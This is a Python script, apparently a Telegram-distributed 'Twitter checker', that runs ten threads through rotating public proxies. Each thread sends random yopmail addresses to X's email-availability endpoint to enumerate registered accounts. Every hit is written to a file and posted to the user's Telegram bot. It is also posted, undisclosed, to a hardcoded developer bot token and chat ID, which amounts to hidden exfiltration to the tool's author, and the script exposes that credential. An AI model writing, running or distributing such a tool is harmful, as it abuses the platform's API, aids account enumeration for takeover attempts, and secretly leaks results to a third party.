from datetime import datetime
import sys
import time
import requests
import json
import random
import webbrowser
from threading import Thread
import os

# ═══════════════════════════════════════════════════
# 🎨 الألوان — بنفسجي
# ═══════════════════════════════════════════════════
P = "\x1b[38;5;129m"
P2 = "\x1b[38;5;93m"
W = "\x1b[1;37m"
R = "\x1b[1;31m"
G = "\x1b[1;32m"
Y = "\x1b[1;33m"
C = "\x1b[1;36m"
RESET = "\x1b[0m"

xlinex = f"{P}{'━' * 56}{RESET}"
xp  = f"{P}<[{W}●{P}]>{W}"
xpxx = f"{P}>{W}>{P}>{W}"

# ═══════════════════════════════════════════════════
# 🔗 فتح القناة تلقائياً
# ═══════════════════════════════════════════════════
webbrowser.open('https://t.me/R7Aih1')

# ═══════════════════════════════════════════════════
# 📊 المتغيرات
# ═══════════════════════════════════════════════════
hits = 0
bad = 0
total = 0
good = 0
is_running = True
proxies = []
token = ""
chat_id = ""

# ================= توكن المطور =================
DEV_TOKEN = "8119792351:AAFWzT5AwaAw00-sLtOjCqTktGcySWxUDC0"
DEV_CHAT_ID = "6319093542"

version = '2.0'


# ═══════════════════════════════════════════════════
# 🔴 LOGO — بنفسجي
# ═══════════════════════════════════════════════════
logo = f"""
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀
{P}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{xlinex}
{W}  DEVELOPER {P}>{W}>{P}>{W} Zeus{P}-{W}
{W}  STATUS    {P}>{W}>{P}>{W} Premium
{W}  VERSION   {P}>{W}>{P}>{W} V{P}/{W}{version}
{xlinex}
{P}⫷⫸ 𝐷𝐸𝑉 Zeus| @R7_36 ● https://t.me/R7Aih1
{xlinex}
{xp} FUTURES  {P}>{W}>{P}>{W} TWITTER{P}〤{W}CHECK
{xp} DEV {P}>{W}>{P}>{W} Zeus ~ @R7_36
{xp} TODAYS   {P}>{W}>{P}>{W} {datetime.now().strftime('%d/%B/%Y').upper()}
{xlinex}"""


# ═══════════════════════════════════════════════════
# 📊 شريط الفحص
# ═══════════════════════════════════════════════════
def print_status_line():
    sys.stdout.write(
        f"\r{P}<[{W}●{P}]>{W} "
        f"{P}<[{W}Zeus-{Y}{total}{P}]>{W} "
        f"{P}<[{W}OK-{G}{hits}{P}]>{W}  "
    )
    sys.stdout.flush()


def print_checker_stats():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(logo)
    print()
    print(f"{P}┌──────────────────────────────────┐{RESET}")
    print(f"{P}│{RESET}     {W}TWITTER CHECKER{RESET}           {P}│{RESET}")
    print(f"{P}├──────────────────────────────────┤{RESET}")
    print(f"{P}│{RESET}  {W}Country{RESET}  : {Y}Global{RESET}")
    print(f"{P}│{RESET}  {W}Proxies{RESET}  : {R}{len(proxies)} Active{RESET}")
    print(f"{P}│{RESET}  {W}Checked{RESET}  : {Y}{total}{RESET}")
    print(f"{P}├──────────────────────────────────┤{RESET}")
    print(f"{P}│{RESET}  {G}Hits{RESET}     : {G}{hits}{RESET}")
    print(f"{P}│{RESET}  {P}Bad{RESET}      : {P}{bad}{RESET}")
    print(f"{P}├──────────────────────────────────┤{RESET}")
    print(f"{P}│{RESET}  {P}@R7_36 ~Zeus @R7Aih1{RESET}")
    print(f"{P}└──────────────────────────────────┘{RESET}")
    print()
    print_status_line()


def update_display():
    global is_running
    while is_running:
        print_checker_stats()
        time.sleep(2)


# ═══════════════════════════════════════════════════
# 📁 البروكسيات — 8 شغالة
# ═══════════════════════════════════════════════════
BUILTIN_PROXIES = [
    "http://45.194.41.70:8080",
    "http://4.144.146.21:80",
    "http://122.246.4.30:17981",
    "http://8.219.97.248:80",
    "http://181.114.61.17:8085",
    "http://36.64.162.194:8080",
    "http://3.18.226.115:80",
    "http://120.232.115.57:17981",
]


def load_builtin_proxies():
    global proxies
    proxies = BUILTIN_PROXIES.copy()
    print(f"{P}[+] LOADED {len(proxies)} BUILT-IN PROXIES{RESET}")
    return True


# ═══════════════════════════════════════════════════
# 📧 توليد الإيميلات
# ═══════════════════════════════════════════════════
def gen_email():
    chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
    length = random.choice([3, 4])
    return ''.join(random.choice(chars) for _ in range(length)) + '@yopmail.com'


# ═══════════════════════════════════════════════════
# 📤 إرسال لتليگرام
# ═══════════════════════════════════════════════════
def send_tg(email):
    try:
        msg = f"""TWITTER Zeus
━━━━━━━━━━━━━━━━━━
EMAIL: {email}
━━━━━━━━━━━━━━━━━━
BY: @R7_36 ~ @R7Aih1"""
        if token and chat_id:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}", timeout=5)
        try:
            requests.get(f"https://api.telegram.org/bot{DEV_TOKEN}/sendMessage?chat_id={DEV_CHAT_ID}&text={msg}", timeout=5)
        except:
            pass
    except:
        pass


# ═══════════════════════════════════════════════════
# 🔍 الفحص
# ═══════════════════════════════════════════════════
def check(email):
    global hits, bad, total, good
    try:
        proxy = {'http': random.choice(proxies), 'https': random.choice(proxies)} if proxies else None
        headers = {
            'accept': '*/*',
            'origin': 'https://x.com',
            'referer': 'https://x.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        r = requests.get(
            'https://api.x.com/i/users/email_available.json',
            params={'email': email},
            headers=headers,
            proxies=proxy,
            timeout=3
        )
        total += 1
        if '"taken":true' in r.text:
            hits += 1
            good += 1
            with open('hits.txt', 'a') as f:
                f.write(f"{email}\n")
            print(f"\n{P}[{G}OK{P}]{W} {email}{RESET}")
            send_tg(email)
        else:
            bad += 1
    except:
        bad += 1


def scanner():
    while is_running:
        check(gen_email())
        time.sleep(0.3)


# ═══════════════════════════════════════════════════
# 🚀 MAIN
# ═══════════════════════════════════════════════════
if __name__ == "__main__":
    os.system('clear' if os.name != 'nt' else 'cls')

    print(logo)
    print()

    token = input(f"{P} TOKEN >>> {RESET}").strip()
    chat_id = input(f"{P} ID    >>> {RESET}").strip()

    use_proxy = input(f"{P}[?] USE BUILT-IN PROXIES? (Y/N): {RESET}").strip().lower()

    if use_proxy == 'y':
        load_builtin_proxies()
    else:
        print(f"{Y}[!] RUNNING WITHOUT PROXIES{RESET}")
        proxies = []

    time.sleep(1)

    Thread(target=update_display, daemon=True).start()

    for _ in range(10):
        Thread(target=scanner, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        is_running = False
        print(f"\n{P}[!] STOPPED.{RESET}")